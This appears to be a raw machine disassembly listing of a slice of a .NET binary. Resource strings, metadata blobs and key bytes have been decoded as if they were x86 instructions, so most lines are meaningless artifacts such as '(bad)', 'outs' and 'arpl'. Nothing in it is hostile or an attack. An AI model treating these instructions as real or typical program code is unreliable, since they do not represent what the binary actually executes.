  409884:	add    BYTE PTR [eax+eax*1+0x45],ah
  409888:	add    BYTE PTR [edx+0x0],dh
  40988b:	jb     0x40988d
  40988d:	outs   dx,DWORD PTR ds:[esi]
  40988e:	add    BYTE PTR [edx+0x0],dh
  409891:	inc    esp
  409892:	add    BYTE PTR [ebp+0x0],dh
  409895:	jo     0x409897
  409897:	ins    BYTE PTR es:[edi],dx
  409898:	add    BYTE PTR [ecx+0x0],ch
  40989b:	arpl   WORD PTR [eax],ax
  40989d:	popa   
  40989e:	add    BYTE PTR [eax+eax*1+0x65],dh
  4098a2:	add    BYTE PTR [eax+0x0],dl
  4098a5:	popa   
  4098a6:	add    BYTE PTR [edx+0x0],dh
  4098a9:	popa   
  4098aa:	add    BYTE PTR [ebp+0x0],ch
  4098ad:	add    BYTE PTR [ecx],ch
  4098af:	push   edx
  4098b0:	add    BYTE PTR [ebp+0x0],ah
  4098b3:	popa   
  4098b4:	add    BYTE PTR [eax+eax*1+0x45],ah
  4098b8:	add    BYTE PTR [edx+0x0],dh
  4098bb:	jb     0x4098bd
  4098bd:	outs   dx,DWORD PTR ds:[esi]
  4098be:	add    BYTE PTR [edx+0x0],dh
  4098c1:	inc    esi
  4098c2:	add    BYTE PTR [ecx+0x0],ah
  4098c5:	imul   eax,DWORD PTR [eax],0x65006c
  4098cb:	add    BYTE PTR fs:[eax+0x0],dl
  4098cf:	popa   
  4098d0:	add    BYTE PTR [edx+0x0],dh
  4098d3:	jae    0x4098d5
  4098d5:	add    BYTE PTR gs:[eax],al
  4098d8:	sub    eax,0x650052
  4098dd:	popa   
  4098de:	add    BYTE PTR [eax+eax*1+0x45],ah
  4098e2:	add    BYTE PTR [edx+0x0],dh
  4098e5:	jb     0x4098e7
  4098e7:	outs   dx,DWORD PTR ds:[esi]
  4098e8:	add    BYTE PTR [edx+0x0],dh
  4098eb:	dec    ecx
  4098ec:	add    BYTE PTR [esi+0x0],ch
  4098ef:	jbe    0x4098f1
  4098f1:	popa   
  4098f2:	add    BYTE PTR [eax+eax*1+0x69],ch
  4098f6:	add    BYTE PTR [eax+eax*1+0x53],ah
  4098fa:	add    BYTE PTR [ecx+0x0],bh
  4098fd:	outs   dx,BYTE PTR ds:[esi]
  4098fe:	add    BYTE PTR [eax+eax*1+0x61],dh
  409902:	add    BYTE PTR [eax+0x0],bh
  409905:	add    BYTE PTR [ebx],dh
  409907:	push   edx
  409908:	add    BYTE PTR [ebp+0x0],ah
  40990b:	popa   
  40990c:	add    BYTE PTR [eax+eax*1+0x45],ah
  409910:	add    BYTE PTR [edx+0x0],dh
  409913:	jb     0x409915
  409915:	outs   dx,DWORD PTR ds:[esi]
  409916:	add    BYTE PTR [edx+0x0],dh
  409919:	dec    ebp
  40991a:	add    BYTE PTR [ecx+0x0],ch
  40991d:	jae    0x40991f
  40991f:	jae    0x409921
  409921:	imul   eax,DWORD PTR [eax],0x67006e
  409927:	dec    ebp
  409928:	add    BYTE PTR [ecx+0x0],ah
  40992b:	outs   dx,BYTE PTR ds:[esi]
  40992c:	add    BYTE PTR [eax+eax*1+0x69],ah
  409930:	add    BYTE PTR [eax+eax*1+0x6f],dh
  409934:	add    BYTE PTR [edx+0x0],dh
  409937:	jns    0x409939
  409939:	add    BYTE PTR [ebx],dh
  40993b:	push   ebx
  40993c:	add    BYTE PTR [ebp+0x0],ah
  40993f:	jae    0x409941
  409941:	jae    0x409943
  409943:	imul   eax,DWORD PTR [eax],0x6e006f
  409949:	inc    ebp
  40994a:	add    BYTE PTR [edx+0x0],dh
  40994d:	jb     0x40994f
  40994f:	outs   dx,DWORD PTR ds:[esi]
  409950:	add    BYTE PTR [edx+0x0],dh
  409953:	dec    ecx
  409954:	add    BYTE PTR [esi+0x0],ch
  409957:	jbe    0x409959
  409959:	popa   
  40995a:	add    BYTE PTR [eax+eax*1+0x69],ch
  40995e:	add    BYTE PTR [eax+eax*1+0x52],ah
  409962:	add    BYTE PTR [ebp+0x0],ah
  409965:	popa   
  409966:	add    BYTE PTR [eax+eax*1+0x65],ah
  40996a:	add    BYTE PTR [edx+0x0],dh
  40996d:	add    BYTE PTR [ebp+0x53],cl
  409970:	add    BYTE PTR [eax+eax*1+0x61],dh
  409974:	add    BYTE PTR [edx+0x0],dh
  409977:	je     0x409979
  409979:	dec    edi
  40997a:	add    BYTE PTR [ebp+0x0],dh
  40997d:	je     0x40997f
  40997f:	jo     0x409981
  409981:	jne    0x409983
  409983:	je     0x409985
  409985:	inc    ebx
  409986:	add    BYTE PTR [edi+0x0],ch
  409989:	ins    BYTE PTR es:[edi],dx
  40998a:	add    BYTE PTR [eax+eax*1+0x65],ch
  40998e:	add    BYTE PTR [ebx+0x0],ah
  409991:	je     0x409993
  409993:	imul   eax,DWORD PTR [eax],0x6e006f
  409999:	inc    ecx
  40999a:	add    BYTE PTR [eax+eax*1+0x72],ch
  40999e:	add    BYTE PTR [ebp+0x0],ah
  4099a1:	popa   
  4099a2:	add    BYTE PTR [eax+eax*1+0x79],ah
  4099a6:	add    BYTE PTR [ecx+0x0],cl
  4099a9:	outs   dx,BYTE PTR ds:[esi]
  4099aa:	add    BYTE PTR [eax+0x0],dl
  4099ad:	jb     0x4099af
  4099af:	outs   dx,DWORD PTR ds:[esi]
  4099b0:	add    BYTE PTR [edi+0x0],ah
  4099b3:	jb     0x4099b5
  4099b5:	add    BYTE PTR gs:[ebx+0x0],dh
  4099b9:	jae    0x4099bb
  4099bb:	add    BYTE PTR [ecx],dh
  4099bd:	push   ebx
  4099be:	add    BYTE PTR [ecx+0x0],bh
  4099c1:	jae    0x4099c3
  4099c3:	je     0x4099c5
  4099c5:	add    BYTE PTR gs:[ebp+0x0],ch
  4099c9:	push   edi
  4099ca:	add    BYTE PTR [ecx+0x0],ch
  4099cd:	add    BYTE PTR fs:[ebp+0x0],ah
  4099d1:	dec    edi
  4099d2:	add    BYTE PTR [ebp+0x0],dh
  4099d5:	je     0x4099d7
  4099d7:	jo     0x4099d9
  4099d9:	jne    0x4099db
  4099db:	je     0x4099dd
  4099dd:	push   ebx
  4099de:	add    BYTE PTR [eax+eax*1+0x61],dh
  4099e2:	add    BYTE PTR [edx+0x0],dh
  4099e5:	je     0x4099e7
  4099e7:	imul   eax,DWORD PTR [eax],0x67006e
  4099ed:	add    BYTE PTR [edi],ch
  4099ef:	push   esp
  4099f0:	add    BYTE PTR [edx+0x0],dh
  4099f3:	popa   
  4099f4:	add    BYTE PTR [ebx+0x0],ah
  4099f7:	add    BYTE PTR gs:[eax+0x0],dl
  4099fb:	jb     0x4099fd
  4099fd:	outs   dx,DWORD PTR ds:[esi]
  4099fe:	add    BYTE PTR [ebx+0x0],ah
  409a01:	add    BYTE PTR gs:[ebx+0x0],dh
  409a05:	jae    0x409a07
  409a07:	push   eax
  409a08:	add    BYTE PTR [ecx+0x0],ah
  409a0b:	jb     0x409a0d
  409a0d:	jae    0x409a0f
  409a0f:	imul   eax,DWORD PTR [eax],0x67006e
  409a15:	push   esp
  409a16:	add    BYTE PTR [ebp+0x0],ah
  409a19:	js     0x409a1b
  409a1b:	je     0x409a1d
  409a1d:	add    BYTE PTR [edi],dh
  409a1f:	push   esp
  409a20:	add    BYTE PTR [edx+0x0],dh
  409a23:	popa   
  409a24:	add    BYTE PTR [ebx+0x0],ah
  409a27:	add    BYTE PTR gs:[eax+0x0],dl
  409a2b:	jb     0x409a2d
  409a2d:	outs   dx,DWORD PTR ds:[esi]
  409a2e:	add    BYTE PTR [ebx+0x0],ah
  409a31:	add    BYTE PTR gs:[ebx+0x0],dh
  409a35:	jae    0x409a37
  409a37:	push   esp
  409a38:	add    BYTE PTR [ecx+0x0],ah
  409a3b:	bound  eax,QWORD PTR [eax]
  409a3d:	ins    BYTE PTR es:[edi],dx
  409a3e:	add    BYTE PTR [ebp+0x0],ah
  409a41:	dec    esi
  409a42:	add    BYTE PTR [ecx+0x0],ah
  409a45:	ins    DWORD PTR es:[edi],dx
  409a46:	add    BYTE PTR [ebp+0x0],ah
  409a49:	dec    eax
  409a4a:	add    BYTE PTR [ebp+0x0],ah
  409a4d:	popa   
  409a4e:	add    BYTE PTR [eax+eax*1+0x65],ah
  409a52:	add    BYTE PTR [edx+0x0],dh
  409a55:	add    BYTE PTR ds:0x720054,dh
  409a5b:	popa   
  409a5c:	add    BYTE PTR [ebx+0x0],ah
  409a5f:	add    BYTE PTR gs:[eax+0x0],dl
  409a63:	jb     0x409a65
  409a65:	outs   dx,DWORD PTR ds:[esi]
  409a66:	add    BYTE PTR [ebx+0x0],ah
  409a69:	add    BYTE PTR gs:[ebx+0x0],dh
  409a6d:	jae    0x409a6f
  409a6f:	push   esp
  409a70:	add    BYTE PTR [ecx+0x0],ah
  409a73:	bound  eax,QWORD PTR [eax]
  409a75:	ins    BYTE PTR es:[edi],dx
  409a76:	add    BYTE PTR [ebp+0x0],ah
  409a79:	push   eax
  409a7a:	add    BYTE PTR [ecx+0x0],ch
  409a7d:	add    BYTE PTR fs:[eax+0x0],cl
  409a81:	add    BYTE PTR gs:[ecx+0x0],ah
  409a85:	add    BYTE PTR fs:[ebp+0x0],ah
  409a89:	jb     0x409a8b
  409a8b:	add    BYTE PTR [ebx],ch
  409a8d:	push   esp
  409a8e:	add    BYTE PTR [edx+0x0],dh
  409a91:	popa   
  409a92:	add    BYTE PTR [ebx+0x0],ah
  409a95:	add    BYTE PTR gs:[eax+0x0],dl
  409a99:	jb     0x409a9b
  409a9b:	outs   dx,DWORD PTR ds:[esi]
  409a9c:	add    BYTE PTR [ebx+0x0],ah
  409a9f:	add    BYTE PTR gs:[ebx+0x0],dh
  409aa3:	jae    0x409aa5
  409aa5:	push   esp
  409aa6:	add    BYTE PTR [ecx+0x0],ah
  409aa9:	bound  eax,QWORD PTR [eax]
  409aab:	ins    BYTE PTR es:[edi],dx
  409aac:	add    BYTE PTR [ebp+0x0],ah
  409aaf:	push   esp
  409ab0:	add    BYTE PTR [ebp+0x0],ah
  409ab3:	js     0x409ab5
  409ab5:	je     0x409ab7
  409ab7:	add    BYTE PTR [ebx],bh
  409ab9:	push   ebp
  409aba:	add    BYTE PTR [esi+0x0],ch
  409abd:	popa   
  409abe:	add    BYTE PTR [edx+0x0],ah
  409ac1:	ins    BYTE PTR es:[edi],dx
  409ac2:	add    BYTE PTR [ebp+0x0],ah
  409ac5:	push   esp
  409ac6:	add    BYTE PTR [edi+0x0],ch
  409ac9:	inc    ebx
  409aca:	add    BYTE PTR [edx+0x0],dh
  409acd:	add    BYTE PTR gs:[ecx+0x0],ah
  409ad1:	je     0x409ad3
  409ad3:	add    BYTE PTR gs:[edi+0x0],cl
  409ad7:	jne    0x409ad9
  409ad9:	je     0x409adb
  409adb:	jo     0x409add
  409add:	jne    0x409adf
  409adf:	je     0x409ae1
  409ae1:	inc    esp
  409ae2:	add    BYTE PTR [ecx+0x0],ch
  409ae5:	jb     0x409ae7
  409ae7:	add    BYTE PTR gs:[ebx+0x0],ah
  409aeb:	je     0x409aed
  409aed:	outs   dx,DWORD PTR ds:[esi]
  409aee:	add    BYTE PTR [edx+0x0],dh
  409af1:	jns    0x409af3
  409af3:	add    BYTE PTR [edi+0x55],al
  409af6:	add    BYTE PTR [esi+0x0],ch
  409af9:	popa   
  409afa:	add    BYTE PTR [ebp+0x0],dh
  409afd:	je     0x409aff
  409aff:	push   0x72006f00
  409b04:	add    BYTE PTR [ecx+0x0],ch
  409b07:	jp     0x409b09
  409b09:	add    BYTE PTR gs:[eax+eax*1+0x41],ah
  409b0e:	add    BYTE PTR [ebx+0x0],ah
  409b11:	arpl   WORD PTR [eax],ax
  409b13:	add    BYTE PTR gs:[ebx+0x0],dh
  409b17:	jae    0x409b19
  409b19:	push   esp
  409b1a:	add    BYTE PTR [edi+0x0],ch
  409b1d:	dec    edi
  409b1e:	add    BYTE PTR [ebp+0x0],dh
  409b21:	je     0x409b23
  409b23:	jo     0x409b25
  409b25:	jne    0x409b27
  409b27:	je     0x409b29
  409b29:	inc    esp
  409b2a:	add    BYTE PTR [ecx+0x0],ch
  409b2d:	jb     0x409b2f
  409b2f:	add    BYTE PTR gs:[ebx+0x0],ah
  409b33:	je     0x409b35
  409b35:	outs   dx,DWORD PTR ds:[esi]
  409b36:	add    BYTE PTR [edx+0x0],dh
  409b39:	jns    0x409b3b
  409b3b:	add    BYTE PTR [ebp+0x5485ab19],dl
  409b41:	cwde   
  409b42:	adc    DWORD PTR [edi-0x72],ecx
  409b45:	std    
  409b46:	rol    BYTE PTR [ebx],1
  409b48:	(bad)  
  409b49:	(bad)  
  409b4a:	out    dx,eax
  409b4b:	int3   
  409b4c:	add    BYTE PTR [eax],cl
  409b4e:	mov    bh,0x7a
  409b50:	pop    esp
  409b51:	push   esi
  409b52:	sbb    DWORD PTR [eax+eiz*8],esi
  409b55:	mov    DWORD PTR [eax],ecx
  409b57:	mov    al,0x3f
  409b59:	pop    edi
  409b5a:	jg     0x409b6d
  409b5c:	aad    0xa
  409b5e:	cmp    al,BYTE PTR [esi]
  409b60:	adc    eax,0x12010912
  409b65:	or     eax,0x8010005
  409b6a:	sbb    eax,0x100050e
  409b6f:	push   cs
  409b70:	adc    ch,BYTE PTR [eax*1+0x12010100]
  409b77:	sub    al,0x9
  409b79:	add    BYTE PTR [edx],al
  409b7b:	add    DWORD PTR [esi],ecx
  409b7d:	adc    eax,0xe011912
  409b82:	add    eax,DWORD PTR [eax]
  409b84:	add    BYTE PTR [esi],cl
  409b86:	push   es
  409b87:	and    BYTE PTR [ecx],al
  409b89:	adc    DWORD PTR [eax],esi
  409b8b:	adc    ch,BYTE PTR [ebx+eax*1]
  409b8e:	and    BYTE PTR [eax],al
  409b90:	add    DWORD PTR [esi],eax
  409b92:	add    BYTE PTR [ecx],al
  409b94:	adc    DWORD PTR [eax],esi
  409b96:	adc    DWORD PTR ds:0x1010005,ebx
  409b9c:	adc    ah,BYTE PTR [ecx]
  409b9e:	or     DWORD PTR [eax],eax
  409ba0:	add    DWORD PTR ds:0xe012512,edx
  409ba6:	adc    ah,BYTE PTR [ecx]
  409ba8:	add    eax,DWORD PTR [esi]
  409baa:	adc    DWORD PTR [ecx],ebp
  409bac:	add    al,BYTE PTR [esi]
  409bae:	or     BYTE PTR [eax],cl
  409bb0:	push   es
  409bb1:	adc    eax,0x11022d12
  409bb6:	sub    DWORD PTR [esi],ecx
  409bb8:	add    eax,0x12010120
  409bbd:	or     eax,0x28110603
  409bc2:	add    al,0x0
  409bc4:	add    BYTE PTR [eax],al
  409bc6:	add    BYTE PTR [ecx+eax*1],al
  409bc9:	add    BYTE PTR [eax],al
  409bcb:	add    BYTE PTR [edx+eax*1],al
  409bce:	add    BYTE PTR [eax],al
  409bd0:	add    BYTE PTR [esp+eax*1],al
  409bd3:	add    BYTE PTR [eax],al
  409bd5:	add    BYTE PTR [eax+ecx*1],al
  409bd8:	add    BYTE PTR [eax],al
  409bda:	add    BYTE PTR [edx],al
  409bdc:	push   es
  409bdd:	add    eax,DWORD PTR [edx]
  409bdf:	das    
  409be0:	add    BYTE PTR ds:0x1d010120,al
  409be6:	push   cs
  409be7:	add    al,0x20
  409be9:	add    BYTE PTR [edx],dl
  409beb:	or     al,0x5
  409bed:	and    BYTE PTR [ecx],al
  409bef:	add    DWORD PTR [edx],edx
  409bf1:	or     al,0x4
  409bf3:	and    BYTE PTR [eax],al
  409bf5:	adc    DWORD PTR [eax],ebp
  409bf7:	add    eax,0x11010120
  409bfc:	sub    BYTE PTR [eax+eiz*1],al
  409bff:	add    BYTE PTR [ecx],dl
  409c01:	xor    DWORD PTR ds:0x11010120,eax
  409c07:	xor    DWORD PTR [ebx],eax
  409c09:	and    BYTE PTR [eax],al
  409c0b:	add    al,BYTE PTR [eax+eiz*1]
  409c0e:	add    DWORD PTR [ecx],eax
  409c10:	add    al,BYTE PTR [ebx]
  409c12:	and    BYTE PTR [eax],al
  409c14:	push   cs
  409c15:	add    al,0x20
  409c17:	add    DWORD PTR [ecx],eax
  409c19:	push   cs
  409c1a:	add    al,0x20
  409c1c:	add    BYTE PTR [edx],dl
  409c1e:	xor    al,0x5
  409c20:	and    BYTE PTR [ecx],al
  409c22:	add    DWORD PTR [edx],edx
  409c24:	xor    al,0x4
  409c26:	and    BYTE PTR [eax],al
  409c28:	adc    dh,BYTE PTR ds:0x1012005
  409c2e:	adc    dh,BYTE PTR ds:0x3002003
  409c34:	add    al,0x0
  409c36:	add    DWORD PTR [edx],eax
  409c38:	push   cs
  409c39:	add    al,0x0
  409c3b:	add    BYTE PTR [edx],dl
  409c3d:	xor    eax,0x2020006
  409c42:	push   cs
  409c43:	adc    BYTE PTR [esi],cl
  409c45:	pop    es
  409c46:	add    BYTE PTR [edx],al
  409c48:	add    cl,BYTE PTR [esi]
  409c4a:	adc    BYTE PTR [edx],dl
  409c4c:	xor    al,0x7
  409c4e:	and    BYTE PTR [edx],al
  409c50:	add    cl,BYTE PTR [esi]
  409c52:	adc    BYTE PTR [edx],dl
  409c54:	xor    eax,0x2022006
  409c59:	push   cs
  409c5a:	adc    BYTE PTR [esi],cl
  409c5c:	add    esp,DWORD PTR [eax]
  409c5e:	add    BYTE PTR [eax],cl
  409c60:	add    eax,DWORD PTR [esi]
  409c62:	adc    cl,BYTE PTR [ebx+eax*1]
  409c65:	push   es
  409c66:	adc    DWORD PTR [ecx],esi
  409c68:	add    al,BYTE PTR [esi]
  409c6a:	add    al,BYTE PTR [edx]
  409c6c:	push   es
  409c6d:	push   cs
  409c6e:	add    eax,DWORD PTR [esi]
  409c70:	adc    dh,BYTE PTR [ebx+eax*1]
  409c73:	push   es
  409c74:	adc    dh,BYTE PTR ds:0x12002804
  409c7a:	or     al,0x4
  409c7c:	sub    BYTE PTR [eax],al
  409c7e:	adc    DWORD PTR [eax],ebp
  409c80:	add    al,0x28
  409c82:	add    BYTE PTR [ecx],dl
  409c84:	xor    DWORD PTR [ebx],eax
  409c86:	sub    BYTE PTR [eax],al
  409c88:	add    al,BYTE PTR [ebx]
  409c8a:	sub    BYTE PTR [eax],al
  409c8c:	push   cs
  409c8d:	add    al,0x28
  409c8f:	add    BYTE PTR [edx],dl
  409c91:	xor    al,0x4
  409c93:	sub    BYTE PTR [eax],al
  409c95:	adc    dh,BYTE PTR ds:0x3002803
  409c9b:	add    eax,DWORD PTR [esi]
  409c9d:	adc    DWORD PTR [eax],esi
  409c9f:	add    al,0xa
  409ca1:	add    BYTE PTR [eax],al
  409ca3:	add    BYTE PTR [ebx+ecx*1],al
  409ca6:	add    BYTE PTR [eax],al
  409ca8:	add    BYTE PTR [esp+ecx*1],al
  409cab:	add    BYTE PTR [eax],al
  409cad:	add    BYTE PTR [ecx*1+0x4000000],al
  409cb4:	(bad)  
  409cb5:	(bad)  
  409cb6:	(bad)  
  409cb7:	inc    DWORD PTR [ebx+eax*1]
  409cba:	add    BYTE PTR [eax],al
  409cbc:	add    BYTE PTR [esi],al
  409cbe:	push   es
  409cbf:	adc    eax,0x8013911
  409cc4:	add    al,0x20
  409cc6:	add    DWORD PTR [ecx],eax
  409cc8:	or     BYTE PTR [edi],al
  409cca:	and    BYTE PTR [eax],al
  409ccc:	adc    eax,0x8013911
  409cd1:	add    al,0x20
  409cd3:	add    BYTE PTR [edx],dl
  409cd5:	cmp    eax,0x15002807
  409cda:	adc    DWORD PTR [ecx],edi
  409cdc:	add    DWORD PTR [eax],ecx
  409cde:	add    al,0x20
  409ce0:	add    BYTE PTR [edx],dl
  409ce2:	inc    ecx
  409ce3:	add    eax,0x12010120
  409ce8:	inc    ecx
  409ce9:	or     BYTE PTR [eax],ah
  409ceb:	add    dl,BYTE PTR [ecx]
  409ced:	xor    BYTE PTR [edx],dl
  409cef:	xor    eax,0x20064512
  409cf4:	add    DWORD PTR [ecx],edx
  409cf6:	dec    ecx
  409cf7:	adc    al,BYTE PTR [ebp+0x3]
  409cfa:	push   es
  409cfb:	adc    al,BYTE PTR [ecx+0x4]
  409cfe:	sub    BYTE PTR [eax],al
  409d00:	adc    al,BYTE PTR [ecx+0x3]
  409d03:	push   es
  409d04:	adc    cl,BYTE PTR [ebp+0x3]
  409d07:	push   es
  409d08:	adc    dl,BYTE PTR [ecx+0x4]
  409d0b:	add    BYTE PTR [eax],al
  409d0d:	adc    cl,BYTE PTR [ebp+0x4]
  409d10:	add    BYTE PTR [eax],al
  409d12:	adc    dl,BYTE PTR [ecx+0x5]
  409d15:	add    BYTE PTR [ecx],al
  409d17:	add    DWORD PTR [edx],edx
  409d19:	push   ecx
  409d1a:	add    al,0x8
  409d1c:	add    BYTE PTR [edx],dl
  409d1e:	dec    ebp
  409d1f:	add    al,0x8
  409d21:	add    BYTE PTR [edx],dl
  409d23:	push   ecx
  409d24:	add    ecx,DWORD PTR [eax]
  409d26:	add    BYTE PTR [esi],cl
  409d28:	pop    es
  409d29:	and    BYTE PTR [edx],al
  409d2b:	add    DWORD PTR [esi],ecx
  409d2d:	adc    DWORD PTR [eax+0x2200591],eax
  409d33:	add    DWORD PTR [esi],ecx
  409d35:	push   cs
  409d36:	push   es
  409d37:	and    BYTE PTR [ecx],al
  409d39:	add    DWORD PTR [ecx],edx
  409d3b:	sub    BYTE PTR [ecx+0x2400a080],0x0
  409d42:	add    BYTE PTR [eax+eax*4],al
  409d45:	add    BYTE PTR [eax],al
  409d47:	xchg   esp,eax
  409d48:	add    BYTE PTR [eax],al
  409d4a:	add    BYTE PTR [esi],al
  409d4c:	add    al,BYTE PTR [eax]
  409d4e:	add    BYTE PTR [eax],al
  409d50:	and    al,0x0
  409d52:	add    BYTE PTR [edx+0x53],dl
  409d55:	inc    ecx
  409d56:	xor    DWORD PTR [eax],eax
  409d58:	add    al,0x0
  409d5a:	add    BYTE PTR [ecx],al
  409d5c:	add    BYTE PTR [ecx],al
  409d5e:	add    BYTE PTR [edi],al
  409d60:	sar    edx,1
  409d62:	push   edi
  409d63:	les    ebp,FWORD PTR [esi+0x2ea3f0d9]
  409d69:	test   BYTE PTR [edx+0xdfdae0f],ch
  409d6f:	jmp    0xecab9b5c
  409d74:	pop    DWORD PTR [edi+0x6c7603fb]
  409d7a:	or     DWORD PTR [ecx+ebx*4-0x6e],0x1e
  409d7f:	mov    dl,0x3b
  409d81:	out    0x9a,eax
  409d83:	(bad)  
  409d85:	fadd   st(1),st
  409d87:	fstp   QWORD PTR [edx+0x211336d2]
  409d8d:	add    dl,BYTE PTR [eax-0x6c38df5]
  409d93:	adc    BYTE PTR [ebp+0x77e1c47f],0x10
  409d9a:	pop    esi
  409d9c:	pop    es
  409d9d:	ja     0x409dee
  409d9f:	sub    eax,ebp
  409da1:	xor    cl,BYTE PTR [esi]
  409da3:	xchg   edx,eax
  409da4:	jmp    0xc021:0xe8e4ec05
  409dab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409dac:	out    dx,eax
  409dad:	call   0x4c9d02a3
  409db2:	or     al,0x93
  409db4:	shr    DWORD PTR [ebx+0x625d2899],0x2c
  409dbb:	stos   BYTE PTR es:[edi],al
  409dbc:	gs sub al,0x1d
  409dbf:	cli    
  409dc0:	(bad)  
  409dc1:	cmp    eax,0x2d6f5d74
  409dc6:	in     eax,0xf1
  409dc8:	jle    0x409e28
  409dca:	scas   eax,DWORD PTR es:[edi]
  409dcb:	pinsrw mm2,WORD PTR [esi-0x75e3d9c3],0x12
  409dd3:	inc    ebx
  409dd4:	sbb    BYTE PTR gs:[eax],ah
  409dd7:	ins    DWORD PTR es:[edi],dx
  409dd8:	rcl    BYTE PTR [ebx-0x2da5b2cc],0x93
  409ddf:	add    al,0x0
  409de1:	add    DWORD PTR [ecx],eax
  409de3:	push   cs
  409de4:	add    eax,0x80110020
  409de9:	mov    ecx,0x1020005
  409dee:	push   cs
  409def:	sbb    al,0x5
  409df1:	add    BYTE PTR [edx],al
  409df3:	push   cs
  409df4:	sbb    al,0x1c
  409df6:	pop    es
  409df7:	add    BYTE PTR [edx],al
  409df9:	add    DWORD PTR [edx],edx
  409dfb:	add    ch,0xe
  409dfe:	add    eax,0x80110020
  409e03:	int    0x5
  409e05:	and    BYTE PTR [eax],al
  409e07:	adc    al,BYTE PTR [eax+0x30006d5]
  409e0d:	add    DWORD PTR [esi],ecx
  409e0f:	sbb    al,0x1c
  409e11:	adc    eax,0x2c120907
  409e16:	adc    cl,BYTE PTR [edx+edx*1]
  409e19:	xor    BYTE PTR [ebp+0xec98012],0x8
  409e20:	adc    al,BYTE PTR [eax-0x7feef73b]
  409e26:	int    0x5
  409e28:	add    BYTE PTR [eax],al
  409e2a:	adc    al,BYTE PTR [eax+0x3d9]
  409e30:	or     BYTE PTR ds:0x80120020,al
  409e36:	fisttp QWORD PTR [eax]
  409e38:	and    BYTE PTR ds:0x20e080e,al
  409e3e:	add    cl,BYTE PTR [esi]
  409e40:	pop    es
  409e41:	pop    es
  409e42:	add    edx,DWORD PTR [edx]
  409e44:	sbb    cl,0x8
  409e47:	push   cs
  409e48:	add    eax,0x2010200
  409e4d:	push   cs
  409e4e:	add    eax,0x12020120
  409e53:	adc    DWORD PTR [ebx],eax
  409e55:	add    BYTE PTR [eax],al
  409e57:	add    DWORD PTR [edi],eax
  409e59:	and    BYTE PTR [eax],al
  409e5b:	adc    eax,0xe011912
  409e60:	push   es
  409e61:	add    BYTE PTR [edx],al
  409e63:	add    DWORD PTR [esi],ecx
  409e65:	sbb    eax,0x400071c
  409e6a:	add    DWORD PTR [esi],ecx
  409e6c:	sbb    al,0x1c
  409e6e:	sbb    al,0x6
  409e70:	pop    es
  409e71:	add    bl,BYTE PTR ds:0x71c1d1c
  409e77:	and    BYTE PTR [edx],al
  409e79:	adc    al,BYTE PTR [eax+0xc1c0ee5]
  409e7f:	adc    BYTE PTR [ecx],al
  409e81:	add    DWORD PTR ds:0x1215001e,ebx
  409e87:	sbb    DWORD PTR [ecx],eax
  409e89:	push   ds
  409e8a:	add    BYTE PTR [ebx],al
  409e8c:	or     al,BYTE PTR [ecx]
  409e8e:	push   cs
  409e8f:	push   es
  409e90:	and    BYTE PTR [ecx],al
  409e92:	adc    al,BYTE PTR [eax+0x20050ee5]
  409e98:	add    BYTE PTR [edx],dl
  409e9a:	and    ch,0x8
  409e9d:	pop    es
  409e9e:	add    edx,DWORD PTR [edx]
  409ea0:	and    ch,0x1d
  409ea3:	push   cs
  409ea4:	or     BYTE PTR [esi],al
  409ea6:	add    BYTE PTR [ecx],al
  409ea8:	adc    al,BYTE PTR [eax+0x90eed]
  409eae:	add    ecx,DWORD PTR [esi]
  409eb0:	adc    al,BYTE PTR [eax+0x1c1d0ef1]
  409eb6:	add    al,0x7
  409eb8:	add    DWORD PTR ds:0x707131c,ebx
  409ebe:	adc    al,BYTE PTR [ebp+0x12]
  409ec1:	cmp    cl,0x12
  409ec4:	cmp    eax,0x12f98012
  409ec9:	add    ch,0x12
  409ecc:	cmp    BYTE PTR [ecx],dl
  409ece:	xor    BYTE PTR ds:0x81120020,al
  409ed4:	add    eax,0x81121508
  409ed9:	or     DWORD PTR [ecx],eax
  409edb:	adc    al,BYTE PTR [ecx+0x20040d]
  409ee1:	adc    eax,DWORD PTR [eax]
  409ee3:	pop    es
  409ee4:	add    BYTE PTR [ebx],al
  409ee6:	add    DWORD PTR [eax],ecx
  409ee8:	push   cs
  409ee9:	sbb    eax,0x407101c
  409eee:	adc    bh,BYTE PTR [eax]
  409ef0:	adc    eax,0x1098112
  409ef5:	adc    al,BYTE PTR [ecx+0x1d30110d]
  409efb:	sbb    al,0x4
  409efd:	add    BYTE PTR [ecx],al
  409eff:	push   cs
  409f00:	push   cs
  409f01:	or     al,0x7
  409f03:	add    al,0x12
  409f05:	adc    DWORD PTR ds:0x81123812,0x4301115
  409f0f:	and    BYTE PTR [eax],al
  409f11:	adc    DWORD PTR ds:0x12020706,ebx
  409f17:	cmp    BYTE PTR [ecx],dl
  409f19:	sbb    eax,0x11030707
  409f1e:	xor    BYTE PTR [esi],cl
  409f20:	adc    DWORD PTR ds:0x6090602,ebx
  409f26:	and    BYTE PTR [ecx],al
  409f28:	add    dl,BYTE PTR [edx]
  409f2a:	sbb    DWORD PTR ds:0x2012006,0x3218112
  409f34:	push   es
  409f35:	adc    al,BYTE PTR [eax+0x3]
  409f38:	and    BYTE PTR [eax],al
  409f3a:	or     DWORD PTR ds:0x1391115,eax
  409f40:	or     BYTE PTR ds:0xe020200,al
  409f46:	push   cs
  409f47:	or     BYTE PTR [edi],al
  409f49:	add    cl,BYTE PTR [edx]
  409f4b:	adc    eax,0x8013911
  409f50:	add    eax,0x21120100
  409f55:	push   cs
  409f56:	or     ah,BYTE PTR [eax]
  409f58:	add    BYTE PTR ds:0x1258112,dl
  409f5e:	adc    al,BYTE PTR [ecx+0x1215081d]
  409f64:	and    DWORD PTR ds:0x1d811201,0x81121509
  409f6e:	sub    DWORD PTR [edx],eax
  409f70:	adc    al,BYTE PTR [ecx+0x2005021d]
  409f76:	add    al,BYTE PTR [ecx]
  409f78:	sbb    al,0x18
  409f7a:	pop    ss
  409f7b:	adc    BYTE PTR [ecx],al
  409f7d:	add    dl,BYTE PTR ds:0x1e011912
  409f83:	add    BYTE PTR ds:0x1e011912,dl
  409f89:	add    BYTE PTR ds:0x2298112,dl
  409f8f:	push   ds
  409f90:	add    BYTE PTR [edx],al
  409f92:	add    eax,0x8112010a
  409f97:	sbb    eax,0x101100a
  409f9c:	or     BYTE PTR ds:0x1e011912,dl
  409fa2:	add    BYTE PTR [eax+edx*1],cl
  409fa5:	add    DWORD PTR [edx],eax
  409fa7:	push   ds
  409fa8:	add    BYTE PTR ds:0x1e011912,dl
  409fae:	add    BYTE PTR [eax],cl
  409fb0:	adc    dl,BYTE PTR [eax]
  409fb2:	add    DWORD PTR [edx],eax
